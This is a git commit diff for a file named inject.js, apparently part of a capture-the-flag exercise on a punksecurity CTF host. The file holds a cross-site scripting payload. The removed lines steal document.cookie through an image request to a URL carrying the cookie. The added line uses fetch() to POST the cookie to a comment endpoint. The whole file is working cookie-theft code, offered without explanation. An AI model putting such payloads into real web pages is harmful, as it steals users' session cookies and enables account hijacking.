b7bdcf8b3d134900247ced8c7308a95e72795289
Panagiotis Vasilikos <94691274+panagiotisvasilikos@users.noreply.github.com>
2023-05-05 00:39:11 +0200

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,2 +1,2 @@
-var i=new Image(); 
-i.src="http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud/?cookie="+document.cookie;
+fetch('http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment', {method: 'POST', mode: 'no-cors', body:"name=gotyou&comment=hello"+document.cookie}); 
+
